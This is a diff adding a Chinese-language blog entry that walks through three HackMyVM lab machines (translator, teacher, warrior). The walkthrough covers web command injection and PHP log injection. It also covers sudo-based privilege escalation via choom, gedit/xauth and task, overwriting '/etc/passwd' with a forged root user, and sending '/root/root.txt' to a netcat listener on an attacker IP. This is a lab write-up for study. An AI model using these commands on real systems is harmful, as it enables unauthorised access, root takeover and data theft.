@@ -74,4 +74,97 @@
         <tag>学习</tag>
       </tags>
   </entry>
+  <entry>
+    <title>hackmyvm复盘</title>
+    <url>/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%981/</url>
+    <content><![CDATA[<h3 id="translator"><a href="#translator" class="headerlink" title="translator"></a>translator</h3><p>来到80端口看到有个translator的界面，随便输了abc，返回zyx，试了几次确认加密逻辑就是一对一替换，a-z，b-y这样，但是数字和大写字母是不会变的，扫了目录也没看到有什么东西</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.15.54.png" ></p>
+<p>然后看了wp才知道，<strong>这个输入框可以命令注入，要先有个分号隔断，并且要输入的命令要先transalte一下</strong>（有点解谜），比如要使用id命令，就要输入“；rw”</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.22.42.png"   alt="像这样" style="zoom:50%;" >
+
+<p>那就先nc拿到一个shell，主要要先把命令translate一下</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316182706.png"   style="zoom:50%;" >
+
+<p>就拿到第一个shell，我感觉有点脑洞，可能是见识的不够多吧，代码逻辑如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = $_GET[&#x27;hmv&#x27;];</span><br><span class="line">$test = escapeshellcmd($test);// 应该是用来防止命令注入的，输入分号后前面跟了一个\，但是经过下面第一个system斜杆又没了</span><br><span class="line">echo (&quot;Translated to:&quot;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$ultima_linea = system(&#x27;echo &#x27;.$test.&#x27;| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba&#x27;);</span><br><span class="line">$ulti = system(&#x27;echo &#x27;.$ultima_linea.&#x27;| tr &quot;php&quot; &quot;wtf&quot;&#x27;); // 用分号实现命令注入</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后在html目录下有个hvxing文件，打开查看是段字符串，第一反应是拿去网页translate一下</p>
+<p>然后就拿到一个密码，到&#x2F;home目录下看到有两个用户，尝试了一下ocean登陆成功</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185134.png"   style="zoom:50%;" >
+
+<p>然后sudo -l看到有choom可以利用，india可以不用密码，gtfobins查询到了提权命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u india /usr/bin/choom -n 0 /bin/sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="第二个flag"><a href="#第二个flag" class="headerlink" title="第二个flag"></a>第二个flag</h4><p>就切换到了india账户，再sudo -l查找，有一个trans可以利用，file看了一下是个是个shell的脚本</p>
+<p>cat看了一下内容很多，切换个思路-h看看帮助文档</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185857.png"   style="zoom:50%;" >
+
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185917.png"   style="zoom:50%;" >
+
+<p>注意到有input file也可以开个http代理，那就尝试结合这两个功能把&#x2F;root&#x2F;root.txt读出来</p>
+<p>kali先开个nc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo trans -i /root/root.txt -x 192.168.64.3:8888</span><br><span class="line">nc -lvp 8888 &gt; trans</span><br></pre></td></tr></table></figure>
+
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316190434.png"   style="zoom:50%;" >
+
+<p>得到一个包，尝试了一下url解码q后面的内容，就拿到flag</p>
+<h4 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512</span><br></pre></td></tr></table></figure>
+
+<p>先生成一个哈希字符串，然后拼接一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">but:$6$qzFU83LRKpBUmZCQ$qCQiwtXEjJmtTAOO2HRJsneHiliw9k2V2/3EtU64v9tP2eaud5fdtp5pQurFVtEsovQjfbo2j3KY.JmF0QqEL/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>先复制一份原来的&#x2F;etc&#x2F;passwd，在&#x2F;tmp目录下伪造一个一样的最下面在加入我们伪造的字符串，<strong>思路就给靶机多加一个用户，有root权限</strong>，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root trans -i www -o /etc/passwd -no-auto</span><br></pre></td></tr></table></figure>
+
+<p>写入之后登陆我们伪造的用户，成功提权到root</p>
+<h5 id="小抽象"><a href="#小抽象" class="headerlink" title="小抽象"></a>小抽象</h5><p>就是利用读写功能获取我们想要的东西，也可以对关键文件进行篡改</p>
+<h3 id="teacher"><a href="#teacher" class="headerlink" title="teacher"></a>teacher</h3><p>web端扫描目录扫到，access.php,log.php，clearlog.php，看一下log.php，内容说有一个rabbit.jpg，访问之后一张·图片·，最开始用stegseek出了得到一个secret.txt里面写着”rabbithole”，不明所以，尝试登陆ssh也没有用</p>
+<p>去到access.jpg，源代码src后面是空的，就联想到有没有可以写入的参数，fuzz了一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200751.png" ></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -u &#x27;http://192.168.64.77/access.php?FUZZ=rabbit.jpg&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=12</span><br></pre></td></tr></table></figure>
+
+<p>果然得到了一个参数‘id’，然后看到了图片</p>
+<p><img   src="/Users/lingtian/Library/Application%20Support/typora-user-images/image-20240316200947799.png"  alt="image-20240316200947799"></p>
+<p>再看看这时的源码，然后就联想到命令注入，先闭合单引号，在写入命令试试</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201116.png" ></p>
+<p>经过一番探索（结合wp），发现可以直接注入php语句，还要配合前面的log.php，因为access.php不会执行，log.php记录了这些并且会执行，例如：</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201809.png" ></p>
+<p>发现了利用点，那就拿到第一个shell了，在html目录下发现有个pdf，下载查看</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202025.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202055.png" ></p>
+<p>虽然密码被糊住了，但是可以在前面找到自己，反向写出来就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pass = ThankYouTeachers</span><br></pre></td></tr></table></figure>
+
+<p>然后就登陆了mrteacher账户，成功拿到userflag</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>Sudo -l 看到有gedit和xauth可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth</span><br></pre></td></tr></table></figure>
+
+<p>查了一下，<strong>xauth命令</strong> 用于显示和编辑被用于连接X服务器的认证信息。<strong>gedit</strong>是个文本编辑器</p>
+<p><strong>思路就是利用gedit查看或修改root.txt（或其他任意文件），在这之前要先利用xauth增加一个认证，并且ssh登陆账号要加-x让SSH 客户端会在连接过程中启用 X11 转发。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh -X mrteacher@192.168.64.77</span><br><span class="line">mrteacher@192.168.64.77&#x27;s password: </span><br><span class="line">Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Mar 16 13:25:36 2024 from 192.168.64.3</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth list  列出当前用户的 X 认证信息</span><br><span class="line">Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">向授权文件中添加一个 MIT-MAGIC-COOKIE-1 权限</span><br></pre></td></tr></table></figure>
+
+<p>增加权限后就使用gedit了，这个时候可以直接读取rootflag，也可以修改&#x2F;etc&#x2F;passwd增加一个用户提权（像上一个靶机一样），两种思路都可以</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /root/root</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>web端命令注入结合日志文件，提权方面两个可利用点的结合，伪造用户或读取文件。</p>
+<h3 id="warrior"><a href="#warrior" class="headerlink" title="warrior"></a>warrior</h3><p>web端扫到robots.txt</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014210.png" ></p>
+<p>User.txt里面有个名字‘loco’我还想过爆破ssh，没有结果，secret.txt一个字符串看起来不是密码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014232.png" ></p>
+<p>internal.php说要把MAC地址改成00:00:00:00:00:a? 最后一个问号还要一个一个试，网上找教程修改kali都mac地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 down</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 hw ether 00:00:00:00:00:af //最后试出来是af</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 up                        </span><br><span class="line">                                  </span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317011739.png" ></p>
+<p>然后再访问，就得到了密码，我尝试了loco作为用户名居然无效，最后看了wp才知道还有一个用户名可以是bro（扶额苦笑），然后顺利登陆，想输入sudo回显没有这个命令，路径没设置好，要调用应该在&#x2F;usr&#x2F;sbin&#x2F;sudo，查到有个task可以利用，找了提权语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/sudo /usr/bin/task execute /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>顺利拿到root</p>
+<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>这个靶机的点主要在切换mac地址，还要尝试出来最后一位是f，bro这个也难想，以后要多考虑可以用cewl生成字典，提权比较简单。</p>
+]]></content>
+      <tags>
+        <tag>blog</tag>
+        <tag>hackmyvm</tag>
+        <tag>复盘</tag>
+      </tags>
+  </entry>
 </search>
